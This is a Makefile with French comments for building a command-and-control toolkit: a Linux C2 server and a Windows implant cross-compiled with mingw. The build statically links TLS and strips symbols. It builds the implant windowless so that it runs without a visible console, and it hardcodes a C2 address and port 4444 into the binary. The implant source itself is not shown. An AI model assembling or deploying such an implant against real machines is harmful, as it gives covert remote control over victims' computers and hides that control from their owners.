# Makefile — C2 server (Linux) + implant (cross-compilé pour Windows)
#
# Prérequis Ubuntu :
#   sudo apt install gcc mingw-w64 libssl-dev openssl -y
#
# Cibles :
#   make server        → c2_server   (Linux, pour le C2)
#   make implant       → implant.exe (Windows, cross-compilé)
#   make all           → les deux
#   make certs         → génère les certificats (nécessite openssl)
#   make clean

CC_LINUX   = gcc
CC_WIN     = x86_64-w64-mingw32-gcc

# Chemin vers OpenSSL statique pour mingw (ajustez si nécessaire).
# Sur Ubuntu : sudo apt install libssl-dev mingw-w64
# Pour une compilation mingw statique propre, utilisez un OpenSSL pré-compilé
# pour Windows, par ex. depuis https://github.com/nicowillis/openssl-mingw64
OPENSSL_WIN_INC ?= /usr/x86_64-w64-mingw32/include
OPENSSL_WIN_LIB ?= /usr/x86_64-w64-mingw32/lib

CFLAGS_LINUX  = -Wall -Wextra -O2
LDFLAGS_LINUX = -lssl -lcrypto

CFLAGS_WIN    = -Wall -Wextra -O2 -I$(OPENSSL_WIN_INC)
LDFLAGS_WIN   = -L$(OPENSSL_WIN_LIB) -lssl -lcrypto -lws2_32 -static -s -mwindows

# IP C2 hardcodée dans l'implant (modifiable au make ou dans .env).
C2_IP   ?= 192.168.56.104
C2_PORT ?= 4444

.PHONY: all server implant certs clean

all: server implant

server: c2_server.c tls.c tls.h
	$(CC_LINUX) $(CFLAGS_LINUX) -o c2_server c2_server.c tls.c $(LDFLAGS_LINUX)
	@echo "[+] c2_server compilé"

implant: implant.c tls.c tls.h
	$(CC_WIN) $(CFLAGS_WIN) \
		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
		-o implant.exe implant.c tls.c \
		$(LDFLAGS_WIN)
	@echo "[+] implant.exe compilé (C2=$(C2_IP):$(C2_PORT))"

certs:
	@bash gen-certs.sh

clean:
	rm -f c2_server implant.exe *.o
